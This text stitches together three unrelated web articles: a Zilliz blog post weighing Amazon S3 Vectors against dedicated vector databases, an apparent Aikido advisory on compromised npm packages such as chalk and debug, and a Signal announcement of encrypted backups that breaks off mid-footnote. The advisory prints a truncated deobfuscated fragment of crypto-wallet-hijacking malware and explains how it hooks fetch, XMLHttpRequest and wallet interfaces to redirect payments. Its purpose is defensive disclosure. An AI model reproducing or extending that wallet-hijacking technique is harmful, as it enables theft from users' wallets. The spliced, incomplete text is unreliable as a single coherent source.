  &lt;main&gt;&lt;head rend="h1"&gt;Will Amazon S3 Vectors Kill Vector Databases—or Save Them?&lt;/head&gt;&lt;p&gt;Not too long ago, AWS dropped something new: S3 Vectors. It’s their first attempt at a vector storage solution, letting you store and query vector embeddings for semantic search right inside Amazon S3.&lt;/p&gt;&lt;p&gt;At a glance, it looks like a lightweight vector database running on top of low-cost object storage—at a price point that is clearly attractive compared to many dedicated vector database solutions.&lt;/p&gt;&lt;p&gt;amazon s3 vectors.png&lt;/p&gt;&lt;p&gt;Naturally, this sparked a lot of hot takes. I’ve seen folks on social media and in engineering circles say this could be the end of purpose-built vector databases—Milvus, Pinecone, Qdrant, and others included. Bold claim, right?&lt;/p&gt;&lt;p&gt;As the engineering architect of Milvus and someone who’s spent way too many late nights thinking about vector search, I have to admit that: S3 Vectors does bring something interesting to the table, especially around cost and integration within the AWS ecosystem. But instead of “killing” vector databases, I see it fitting into the ecosystem as a complementary piece. In fact, its real future probably lies in working with professional vector databases, not replacing them.&lt;/p&gt;&lt;p&gt;In this post, I’ll walk you through why I think that—looking at it from three angles: the tech itself, what it can and can’t do, and what it means for the market.&lt;/p&gt;&lt;head rend="h2"&gt;A Surprising Fact: Vector Storage Can Cost More Than LLM Calls&lt;/head&gt;&lt;p&gt;Vector search is powerful, but it comes with a serious catch: it’s expensive. The computational demands are often one to two orders of magnitude higher than what you’d see in a typical NoSQL database. That gap isn’t just theoretical—it shows up in real bills.&lt;/p&gt;&lt;p&gt;I recently spoke with the CTO of a popular AI note-taking app who told me something surprising: they spend twice as much on vector search as they do on OpenAI API calls. Think about that for a second. Running the retrieval layer costs them more than paying for the LLM itself. That flips the usual assumption on its head.&lt;/p&gt;&lt;p&gt;The 2022 ChatGPT boom only made this more obvious. Suddenly, embeddings were everywhere, and vector data became the fastest-growing data type on the public cloud. Retrieval-Augmented Generation (RAG) was the driver—and with it came three challenges that reshaped what a vector database like Milvus had to do:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt;Massive data explosion: Workloads jumped from tens of millions to tens of billions of vectors almost overnight. That’s not linear growth—it’s a quantum leap, and it broke the old ways of handling data.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Latency tolerance shifted: Since LLMs take time to generate responses anyway, users became more forgiving of slightly slower retrieval. The “sub-10ms recall at all costs” mindset suddenly mattered less.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Cost sensitivity skyrocketed: Doubling or tripling data volume wasn’t just a storage problem; it became a financial crisis if you tried to scale using traditional compute-heavy designs.&lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;p&gt;In short: vector databases had to evolve fast, not because the technology didn’t work, but because the economics of retrieval were suddenly front and center.&lt;/p&gt;&lt;head rend="h2"&gt;The Evolution of Vector Storage: From Memory to Disk, and Now to Object Storage&lt;/head&gt;&lt;p&gt;The pressure around cost and scale forced one conclusion: vector databases couldn’t stay memory-only forever. They had to evolve—first to disk, and now to object storage like S3. This wasn’t a choice; it was an industry inevitability. And if you’ve been following the space, you’ve probably noticed the same trend I have over the last few years.&lt;/p&gt;&lt;p&gt;I’ve seen vector databases go through three distinct stages:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt;Phase I (2018–2022): The Pure Memory Era: In the early Milvus days, we leaned on memory indexes like HNSW and IVF. The performance and recall were fantastic—but the costs were brutal. Memory doesn’t scale cheaply, and everyone paying those cloud bills knew it.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Phase II (2022–2024): The Disk Index Revolution: To break the memory bottleneck, we pioneered a disk-based approach using DiskANN along with our proprietary Cardinal index (exclusive to Zilliz Cloud, the managed Milvus). With tricks like asynchronous I/O (AIO) and io_uring, we managed to squeeze real performance out of disks. The result? A 3–5x cost reduction. Our capacity-optimized compute units (CUs) quickly became bestsellers in Zilliz Cloud.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Phase III (2024– ): The Tiered Storage Era: The next step was obvious: push vector indexes onto cheap object storage. New players like TurboPuffer went all-in on S3, dropping storage costs to ~$0.33/GB/month—a 10x reduction. But the trade-off was just as clear: cold query latency in the 500ms–1s range, and weaker recall precision.&lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;p&gt;At Zilliz, we’ve been working on tiered storage for a while, but we held back release until we could tame cold query performance. Next month, we’ll be rolling out our upgraded extended-capacity CUs with true hot/cold separation in Zilliz Cloud. That means stable cold query latency under 500ms, paired with ultra-high QPS for hot queries. In other words, the best of both worlds.&lt;/p&gt;&lt;head rend="h2"&gt;Amazon S3 Vectors Arrives Right on Cue&lt;/head&gt;&lt;p&gt;With tiered storage already proving itself, it’s no surprise that AWS jumped in with S3 Vectors. In fact, the release feels like a natural extension of what was already happening across the industry. Amazon had been expanding S3’s role with features like S3 Tables, evolving it from “just object storage” into a multi-modal cold storage backbone. Vectors are simply the next modality in that evolution—and it probably won’t stop there. Graphs, key-value, and time series data could all follow the same path.&lt;/p&gt;&lt;p&gt;And Amazon brings three undeniable advantages to the table:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt;Lower cost: among the lowest storage pricing in the industry.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Massive scale: AWS’s machine pools can absorb almost any query load.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Microservice-native architecture: perfectly aligned with vector indexing’s write–build–query workflow.&lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;p&gt;Put together, these give S3 Vectors the makings of an ultra-low-cost, highly scalable cold storage solution for vectors.&lt;/p&gt;&lt;head rend="h2"&gt;S3 Vectors is A True Price Killer, But With Clear Limits&lt;/head&gt;&lt;p&gt;As soon as S3 Vectors was announced, our team put it through comprehensive tests. The results were eye-opening—not just in terms of how cheap it is, but also where the cracks start to show.&lt;/p&gt;&lt;head rend="h3"&gt;S3 Vectors is A True Price Killer&lt;/head&gt;&lt;p&gt;There’s no denying it: S3 Vectors is incredibly cost-effective.&lt;/p&gt;&lt;p&gt;Storage runs at just $0.06/GB, roughly 5 times cheaper than most serverless vector solutions. For a representative workload—say 400 million vectors plus 10 million queries per month—the bill comes out to about $1,217/month. That’s more than a 10x reduction compared to traditional vector databases. For low-QPS, latency-tolerant workloads, it’s almost unbeatable.&lt;/p&gt;&lt;head rend="h3"&gt;But Performance Has Real Constraints&lt;/head&gt;&lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt;Collection size limits: Each S3 table maxes out at 50M vectors, and you can only create up to 10,000 tables.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Cold queries: Latency comes in at ~500ms for 1M vectors and ~700ms for 10M vectors.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Hot queries: Latency stays under 200ms at 200 QPS, but pushing beyond that 200 QPS ceiling is tough.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Write performance: Capped at under 2MB/s. That’s orders of magnitude lower than Milvus (which handles GB/s), though to its credit, writes don’t degrade query performance. Translation: it’s not designed for scenarios with large, frequently changing datasets.&lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;head rend="h3"&gt;Precision and Functionality Trade-Offs&lt;/head&gt;&lt;p&gt;The precision story is where things get tricky. Recall hovers at 85–90%, and you don’t get knobs to tune it higher. Layer on filters, and recall can drop below 50%. In one test where we deleted 50% of data, TopK queries asked for 20 results but could only return 15.&lt;/p&gt;&lt;p&gt;Functionality is also pared down. TopK queries max out at 30. Metadata per record has strict size limits. And you won’t find features like hybrid search, multi-tenancy, or advanced filtering—all of which are must-haves for many production applications.&lt;/p&gt;&lt;head rend="h2"&gt;Dissecting S3 Vectors: The Likely Architecture&lt;/head&gt;&lt;p&gt;After running tests and mapping them against familiar AWS design patterns, we’ve formed a pretty good hypothesis of how S3 Vectors works under the hood. While Amazon hasn’t published full details, the performance characteristics point to five core technologies:&lt;/p&gt;&lt;p&gt;SPFresh Dynamic Indexing: Instead of rebuilding entire indexes after each write, S3 Vectors seems to update only the affected portions. This design keeps write costs low and availability high, but it comes at a price: recall rates slip by a few percentage points after updates.&lt;/p&gt;&lt;p&gt;Deep Quantization (4-bit PQ): To cut down on S3’s I/O overhead, embeddings are likely compressed using 4-bit product quantization.&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt;The upside: storage is cheap, and queries stay fast.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;The downside: recall flatlines around ~85%, and there are no knobs for developers to tune it higher.&lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;p&gt;Post-Filter Mechanism: Filtering looks to be applied after coarse retrieval. That keeps the index unified and simple, but it struggles with complex conditions. In our tests, when we deleted 50% of data, TopK queries requesting 20 results returned only 15—classic signs of a post-filter pipeline. This also suggests Amazon leaned heavily on existing open-source index designs rather than building a custom one from scratch.&lt;/p&gt;&lt;p&gt;Multi-Tier Caching: Hot queries behave much faster, likely thanks to an SSD/NVMe cache sitting in front of S3. But when a query misses the cache, latency jumps significantly. That pattern fits a multi-tier cache hierarchy built to mask object storage’s inherent slowness.&lt;/p&gt;&lt;p&gt;Large-Scale Distributed Scheduling: AWS has no shortage of machine pools. S3 Vectors appears to spread the workload across microservices, pipelining the read → decompress → search flow. The result is what we observed in tests: a remarkably stable latency distribution, even under heavy load.&lt;/p&gt;&lt;head rend="h2"&gt;Where S3 Vectors Fits: The Right Tool for Specific Jobs&lt;/head&gt;&lt;p&gt;After putting S3 Vectors through its paces, it’s clear that it shines in some scenarios and falls short in others. Like most infrastructure tools, it’s not a one-size-fits-all solution—it’s the right tool for the right job.&lt;/p&gt;&lt;head rend="h3"&gt;Where It Works Well&lt;/head&gt;&lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt;Cold data archiving: Perfect for storing history datasets that are rarely accessed. If you can live with 500ms+ query times, the cost savings are unbeatable.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Low-QPS RAG queries: Think of small internal tools or chatbots that run only dozens of queries per day, staying under 100 QPS. For these use cases, latency isn’t a dealbreaker.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Low-cost prototyping: Great for proof-of-concept projects where the goal is to test an idea without spending heavily on infrastructure.&lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;head rend="h3"&gt;Where It Struggles&lt;/head&gt;&lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt;High-performance search and recommendation: If your application needs sub-50ms latency, S3 Vectors simply isn’t built for it.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;High-volume writes or frequent updates: Performance degrades quickly, and recall precision drops noticeably under heavy churn.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Complex query workloads: There’s no support for hybrid search, aggregations, or other advanced querying features.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Multi-tenant production apps: With a hard cap of 10,000 buckets, it’s not designed for large-scale multi-tenant deployments.&lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;p&gt;In other words, S3 Vectors is excellent for cold, cheap, low-QPS scenarios—but it’s not the engine you want to power a recommendation system, a real-time search app, or any high-scale production system.&lt;/p&gt;&lt;head rend="h2"&gt;The Future is Tiered Vector Storage&lt;/head&gt;&lt;p&gt;S3 Vectors doesn’t spell the end of vector databases—it confirms something many of us have been seeing for a while: the future is tiered storage. Instead of keeping every vector in expensive memory or fast disk, workloads will naturally spread across hot, warm, and cold tiers based on how often it’s accessed and what kind of latency the application can tolerate.&lt;/p&gt;&lt;p&gt;Here’s what that looks like in practice:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt;Hot Data Layer (&amp;lt;50ms) – This is where real-time search, recommendations, and targeted ads live. Latency needs to be under 50ms, which means specialized vector databases are still the best option. They’re optimized for both blazing speed and high query throughput.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Warm Data Layer (50–500ms) – Many RAG-based applications and multi-tenant shared services fall here. These workloads don’t need ultra-low latency, but they do need predictable performance at lower cost. S3 Vectors and Milvus’s tiered storage instances fit this middle ground.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Cold Data Layer (&amp;gt;500ms) – Historical archives and offline analysis don’t require real-time responses, so latency in the hundreds of milliseconds is acceptable. What matters here is cost efficiency at massive scale. This is where solutions like S3 + Spark/Daft or the Milvus vector data lake shine.&lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;p&gt;The hot–warm–cold split balances latency, cost, and scale in a way that no single storage tier can cover on its own. It’s a pattern we’ve seen before in relational databases, data warehouses, and even CDNs—and vector storage is now following the same trajectory. This three-tier architecture also lines up closely with the roadmap we’ve been building for Milvus and Zilliz Cloud.&lt;/p&gt;&lt;head rend="h3"&gt;1. A Unified Online + Offline Processing Architecture&lt;/head&gt;&lt;p&gt;AI applications don’t live neatly in separate “online” and “offline” worlds. In reality, data moves constantly between the two. That’s why with the upcoming Milvus 3.0, we will introduce a vector data lake, designed to support both real-time retrieval and offline processing from the same dataset.&lt;/p&gt;&lt;p&gt;In practice, this means one dataset can power your live RAG and search queries, while also feeding into Spark-based offline analysis—for example, curating training data for LLMs. No duplication, no juggling two different pipelines.&lt;/p&gt;&lt;p&gt;We will also roll out the StorageV2 format for the vector data lake, which takes the economics to another level:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt;Up to 100x cheaper for cold data storage.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Up to 100x faster than brute-force Spark queries on hot data.&lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;p&gt;The result is a unified system that minimizes redundancy, keeps costs under control, and makes working with vector data a lot less painful.&lt;/p&gt;&lt;head rend="h3"&gt;2. Building Features AI Developers Actually Need&lt;/head&gt;&lt;p&gt;Over the past two years, AI applications have been moving fast—and so have the requirements for the infrastructure behind them. At Zilliz, we’ve pushed Milvus forward in step with those needs, shipping capabilities like BM25 + vector hybrid search, multi-tenant isolation, hot–cold tiered storage, and MinHash deduplication, along with a long list of developer-focused improvements.&lt;/p&gt;&lt;p&gt;Our philosophy has been simple: when you combine deep understanding of business use cases with the latest technology, you unlock entirely new infrastructure possibilities. That’s the mindset shaping Milvus 3.0, which will bring a new wave of AI-native features designed directly for real-world applications. Among them:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt;Keyword weighting in search – So a query like “red phone” can prioritize red appropriately.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Geolocation support – Store and query location-aware vectors to handle prompts like “find nearby coffee shops.”&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Multi-vector support for RAG – Attach multiple embeddings to each text, improving recall and accuracy in complex retrieval tasks.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Flexible UDF processing – User-defined functions for richer, customizable data processing.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Visual analytics tools – Deeper offline mining and data exploration at scale.&lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;p&gt;And that’s just the start. The bigger point is that Milvus is evolving into a system that’s not only efficient and scalable, but AI-native at its core—purpose-built for how modern applications actually work.&lt;/p&gt;&lt;head rend="h3"&gt;3. Engineering for Scale Without the Price Tag&lt;/head&gt;&lt;p&gt;At Zilliz, we believe that: a 10x cost reduction opens the door to 100x more application use cases. That principle has guided every big milestone in Milvus. Since 2022, we’ve introduced disk-based indexes, GPU acceleration, and RabitQ quantization—all of which have pushed query performance up by orders of magnitude while driving costs down.&lt;/p&gt;&lt;p&gt;Looking ahead, our focus is on squeezing even more efficiency out of the stack:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt;Deeper hardware optimization – Tuning for raw compute power and IOPS performance.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Smarter compression and quantization – Making vectors lighter without giving up accuracy.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Early termination for index queries – Cutting off wasted computation as soon as we have confident results.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Refined tiered indexing – Better cache utilization for faster access to cold data.&lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;p&gt;The end goal hasn’t changed: build infrastructure that just works out of the box, scales on demand, and stays both fast and affordable.&lt;/p&gt;&lt;head rend="h2"&gt;Why the Advent of S3 Vectors Is Good News for Everyone&lt;/head&gt;&lt;p&gt;A lot of people worry that S3 Vectors will make traditional vector databases obsolete. My take is the opposite: its release is good news for the entire industry. In fact, I see three big benefits.&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt;It validates demand. No one can claim vectors are just a fad anymore. If AWS is building a product around it, that’s proof positive that vector storage is a real necessity—not just “indexes wrapped in a database.”&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;It educates the market. With AWS’s reach, more enterprises are now aware of vector databases, which expands the boundaries of what applications can be built.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;It drives innovation. Competition pushes all of us—Milvus included—to optimize harder, cut costs further, and find differentiated strengths.&lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;p&gt;From a positioning standpoint, S3 Vectors looks less like a complete vector database and more like the cold tier of vector storage. Its low cost makes it especially attractive for scenarios that were previously priced out: small teams building RAG apps, individual developers experimenting, or organizations indexing massive datasets with only basic retrieval needs. That’s a real unlock for the ecosystem.&lt;/p&gt;&lt;p&gt;Personally, I also want to acknowledge the AWS engineering team. They’ve been steadily improving their platform—from Lambda debugging to cold start performance—and S3 Vectors is another example of thoughtful product innovation. I’m genuinely curious to see what developers will build now that the economics are this favorable.&lt;/p&gt;&lt;p&gt;So no, the vector database market isn’t being disrupted—it’s maturing into a tiered ecosystem where different solutions serve different performance and cost needs. That’s good for enterprises, good for developers, and good for the overall AI infrastructure stack.&lt;/p&gt;&lt;p&gt;The golden age of vector databases isn’t over—it’s just beginning.&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;A Surprising Fact: Vector Storage Can Cost More Than LLM Calls&lt;/item&gt;&lt;item&gt;The Evolution of Vector Storage: From Memory to Disk, and Now to Object Storage&lt;/item&gt;&lt;item&gt;Amazon S3 Vectors Arrives Right on Cue&lt;/item&gt;&lt;item&gt;S3 Vectors is A True Price Killer, But With Clear Limits&lt;/item&gt;&lt;item&gt;Dissecting S3 Vectors: The Likely Architecture&lt;/item&gt;&lt;item&gt;Where S3 Vectors Fits: The Right Tool for Specific Jobs&lt;/item&gt;&lt;item&gt;The Future is Tiered Vector Storage&lt;/item&gt;&lt;item&gt;Why the Advent of S3 Vectors Is Good News for Everyone&lt;/item&gt;&lt;/list&gt;&lt;head rend="h3"&gt;Content&lt;/head&gt;&lt;head rend="h4"&gt;Start Free, Scale Easily&lt;/head&gt;&lt;p&gt;Try the fully-managed vector database built for your GenAI applications.&lt;/p&gt;Try Zilliz Cloud for Free&lt;head rend="h2"&gt;Keep Reading&lt;/head&gt;&lt;head rend="h3"&gt;Creating Collections in Zilliz Cloud Just Got Way Easier&lt;/head&gt;&lt;p&gt;We've enhanced the entire collection creation experience to bring advanced capabilities directly into the interface, making it faster and easier to build production-ready schemas without switching tools.&lt;/p&gt;&lt;head rend="h3"&gt;DeepRAG: Thinking to Retrieval Step by Step for Large Language Models&lt;/head&gt;&lt;p&gt;In this article, we’ll explore how DeepRAG works, unpack its key components, and show how vector databases like Milvus and Zilliz Cloud can further enhance its retrieval capabilities.&lt;/p&gt;&lt;head rend="h3"&gt;Introducing IBM Data Prep Kit for Streamlined LLM Workflows&lt;/head&gt;&lt;p&gt;The Data Prep Kit (DPK) is an open-source toolkit by IBM Research designed to streamline unstructured data preparation for building AI applications.&lt;/p&gt;&lt;/main&gt;

  &lt;main&gt;
    &lt;p&gt;Starting at September 8th, 13:16 UTC, our Aikido intel feed alerted us to a series packages being pushed to npm, which appeared to contains malicious code. These were 18 very popular packages,&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;backslash (0.26m downloads per week)&lt;/item&gt;
      &lt;item&gt;chalk-template (3.9m downloads per week)&lt;/item&gt;
      &lt;item&gt;supports-hyperlinks (19.2m downloads per week)&lt;/item&gt;
      &lt;item&gt;has-ansi (12.1m downloads per week)&lt;/item&gt;
      &lt;item&gt;simple-swizzle (26.26m downloads per week)&lt;/item&gt;
      &lt;item&gt;color-string (27.48m downloads per week)&lt;/item&gt;
      &lt;item&gt;error-ex (47.17m downloads per week)&lt;/item&gt;
      &lt;item&gt;color-name (191.71m downloads per week)&lt;/item&gt;
      &lt;item&gt;is-arrayish (73.8m downloads per week)&lt;/item&gt;
      &lt;item&gt;slice-ansi (59.8m downloads per week)&lt;/item&gt;
      &lt;item&gt;color-convert (193.5m downloads per week)&lt;/item&gt;
      &lt;item&gt;wrap-ansi (197.99m downloads per week)&lt;/item&gt;
      &lt;item&gt;ansi-regex (243.64m downloads per week)&lt;/item&gt;
      &lt;item&gt;supports-color (287.1m downloads per week)&lt;/item&gt;
      &lt;item&gt;strip-ansi (261.17m downloads per week)&lt;/item&gt;
      &lt;item&gt;chalk (299.99m downloads per week)&lt;/item&gt;
      &lt;item&gt;debug (357.6m downloads per week)&lt;/item&gt;
      &lt;item&gt;ansi-styles (371.41m downloads per week)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;All together, these packages have more than 2 billion downloads per week.&lt;/p&gt;
    &lt;p&gt;The packages were updated to contain a piece of code that would be executed on the client of a website, which silently intercepts crypto and web3 activity in the browser, manipulates wallet interactions, and rewrites payment destinations so that funds and approvals are redirected to attacker-controlled accounts without any obvious signs to the user.&lt;/p&gt;
    &lt;p&gt;To avoid being compromised by packages like this, check out Aikido safe-chain!&lt;/p&gt;
    &lt;head rend="h2"&gt;What happened?&lt;/head&gt;
    &lt;p&gt;The above packages all started having new versions released, an example here being is-arrayish:&lt;/p&gt;
    &lt;p&gt;We can see that the index.js file is modified, and contains obfuscated code:&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;p&gt;After applying a bit of deobfuscation to it, we get a fairly complex piece of code still:&lt;/p&gt;
    &lt;code&gt;var neth = 0;
var rund = 0;
var loval = 0;
async function checkethereumw() {
  try {
    const _0x124ed3 = await window.ethereum.request({
      'method': "eth_accounts"
    });

    &lt;p&gt;This malware is essentially a browser-based interceptor that hijacks both network traffic and application APIs. It injects itself into functions like &lt;code&gt;fetch&lt;/code&gt;, &lt;code&gt;XMLHttpRequest&lt;/code&gt;, and common wallet interfaces, then silently rewrites values in requests and responses. That means any sensitive identifiers, such as payment destinations or approval targets, can be swapped out for attacker, controlled ones before the user even sees or signs them. To make the changes harder to notice, it uses string-matching logic that replaces targets with look-alike values.&lt;/p&gt;
    &lt;p&gt;What makes it dangerous is that it operates at multiple layers: altering content shown on websites, tampering with API calls, and manipulating what usersâ apps believe they are signing. Even if the interface looks correct, the underlying transaction can be redirected in the background.&lt;/p&gt;
    &lt;head rend="h3"&gt;ð How the Malware Works (Step by Step)&lt;/head&gt;
    &lt;list rend="ol"&gt;

      &lt;item&gt;Hooks core functions like &lt;/item&gt;

      &lt;item&gt;Stays stealthy&lt;list rend="ul"&gt;&lt;item&gt;If a crypto wallet is detected, it avoids obvious swaps in the UI to reduce suspicion.&lt;/item&gt;&lt;item&gt;Keeps silent hooks running in the background to capture and alter real transactions.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;

    &lt;p&gt;The maintainer shared that he was compromised by the use of phishing, using this email coming from &lt;code&gt;support [at] npmjs [dot] help&lt;/code&gt; :&lt;/p&gt;
    &lt;p&gt;The domain was registered just three days ago on September 5th, 2025:&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h2"&gt;Maintainer response&lt;/head&gt;
    &lt;p&gt;After Aikido notified the maintainer on Bluesky, he replied at 15:15 UTC that he was aware of being compromised, and starting to clean up the compromised packages.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;p&gt;The author also shared that the phishing email was sent from &lt;code&gt;support [at] npmjs [dot] help&lt;/code&gt; .&lt;/p&gt;
    &lt;p&gt;The author appears to have deleted most of the compromised package before losing access to his account. At the time of writing, the package &lt;code&gt;simple-swizzle&lt;/code&gt; is still compromised&lt;code&gt;.&lt;/code&gt;&lt;/p&gt;

      &lt;item&gt;Make sure you use a package lock file, and use pinned versions&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;How to tell if you are affected using Aikido:&lt;/p&gt;
    &lt;p&gt;If you are an Aikido user, check your central feed and filter on malware issues. The vulnerability be surfaced as a 100/100 critical issue in the feed. Tip: Aikido rescans your repos nightly, though we recommend triggering a full rescan as well.&lt;/p&gt;
    &lt;p&gt;If you are not yet an Aikido user, set up an account and connect your repos. Our proprietary malware coverage is included in the free plan (no credit card required).&lt;/p&gt;
    &lt;p&gt;For future protection, considering using Aikido SafeChainÂ (open source), a secure wrapper for npm, npx, yarn... Safechain sits in your current workflows, it works by intercepting npm, npx, yarn, pnpm and pnpx commands and verifying the packages for malware before install against Aikido Intel - Open Sources Threat Intelligence. Stop threats before they hit your machine.&lt;/p&gt;

  &lt;main&gt;
    &lt;p&gt;In the past, if you broke or lost your phone, your Signal message history was gone. This has been a challenge for people whose most important conversations happen on Signal. Think family photos, sweet messages, important documents, or anything else you don’t want to lose forever. This explains why the most common feature request has been backups; a way for people to get Signal messages back even if their phone is lost or damaged.&lt;/p&gt;
    &lt;p&gt;After careful design and development, we are now starting to roll out secure backups, an opt-in feature. This first phase is available in the latest beta release for Android. This will let us further test this feature in a limited setting, before it rolls out to iOS and Desktop in the near future.&lt;/p&gt;
    &lt;p&gt;Here, we’ll outline the basics of secure backups and provide a high-level overview about how they work and how we built a system that allows you to recover your Signal conversations while maintaining the highest bar for privacy and security.&lt;/p&gt;
    &lt;head rend="h2"&gt;Secure Backups 101&lt;/head&gt;
    &lt;p&gt;Secure backups let you save an archive of your Signal conversations in a privacy-preserving form, refreshed every day; giving you the ability to restore your chats even if you lose access to your phone. Signal’s secure backups are opt-in and, of course, end-to-end encrypted. So if you don’t want to create a secure backup archive of your Signal messages and media, you never have to use the feature.1&lt;/p&gt;
    &lt;p&gt;If you do decide to opt in to secure backups, you’ll be able to securely back up all of your text messages2 and the last 45 days’ worth of media3 for free.&lt;/p&gt;
    &lt;p&gt;If you want to back up your media history beyond 45 days4, as well as your message history, we also offer a paid subscription plan for US$1.99 per month.5&lt;/p&gt;
    &lt;p&gt;This is the first time we’ve offered a paid feature. The reason we’re doing this is simple: media requires a lot of storage, and storing and transferring large amounts of data is expensive. As a nonprofit that refuses to collect or sell your data, Signal needs to cover those costs differently than other tech organizations that offer similar products but support themselves by selling ads and monetizing data.&lt;/p&gt;
    &lt;head rend="h2"&gt;Anatomy of Secure Backups: Privacy First, Always&lt;/head&gt;
    &lt;p&gt;At Signal, our commitment to privacy informs which features we build and the ways that we build them.&lt;/p&gt;
    &lt;p&gt;Using the same zero-knowledge technology that enables Signal groups to work without revealing intimate metadata, backup archives are stored without a direct link to a specific backup payment or Signal user account.&lt;/p&gt;
    &lt;p&gt;At the core of secure backups is a 64-character recovery key that is generated on your device. This key is yours and yours alone; it is never shared with Signal’s servers.6 Your recovery key is the only way to “unlock” your backup when you need to restore access to your messages. Losing it means losing access to your backup permanently, and Signal cannot help you recover it. You can generate a new key if you choose. We recommend storing this key securely (writing it down in a notebook or a secure password manager, for example).&lt;/p&gt;
    &lt;p&gt;These choices are part and parcel of Signal’s guiding mission to collect as close to no data as possible, and to make sure that any information that is required to make Signal robust and usable cannot be tied back to the people who depend on Signal.7 This is why wherever there’s a choice between security and any other objective, we’ve prioritized security.8&lt;/p&gt;
    &lt;head rend="h2"&gt;Enabling Secure Backups&lt;/head&gt;
    &lt;p&gt;If you want to opt in to secure backups, you can do so from your Signal Settings menu. For now, only people running the latest beta version of Signal on Android will be able to opt in. But soon, we’ll be rolling this feature out across all platforms.&lt;/p&gt;
    &lt;p&gt;Once you’ve enabled secure backups, your device will automatically create a fresh secure backup archive every day, replacing the previous day’s archive.9 Only you can decrypt your backup archive, which will allow you to restore your message database (excluding view-once messages and messages scheduled to disappear within the next 24 hours). Because your secure backup archive is refreshed daily, anything you deleted in the past 24 hours, or any messages set to disappear are removed from the latest daily secure backup archive, as you intended.&lt;/p&gt;
    &lt;head rend="h2"&gt;Backing up, moving forward&lt;/head&gt;
    &lt;p&gt;We’re excited to introduce secure backups, making sure you can retain access to your Signal messages even when your phone is lost or destroyed. But secure backups aren’t the end of the road.&lt;/p&gt;
    &lt;p&gt;The technology that underpins this initial version of secure backups will also serve as the foundation for more secure backup options in the near future. Our future plans include letting you save a secure backup archive to the location of your choosing, alongside features that let you transfer your encrypted message history between Android, iOS, and Desktop devices.&lt;/p&gt;
    &lt;p&gt;Secure backups are available in today’s Android beta release. A full public release, along with iOS and Desktop support, is coming soon.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Someone you’re chatting with could choose to back up your conversation even if you haven’t activated the feature. These chats will continue to be protected in ways that we explain in this post, ensuring that your Signal conversations are only accessible to you and the people you are communicating with. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The free tier includes 100 MiB of message storage. Messages are compressed and stored in a secure backup archive, and we think 100 MiB will be large enough for even heavy Signal users to back up the text of all of their messages. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
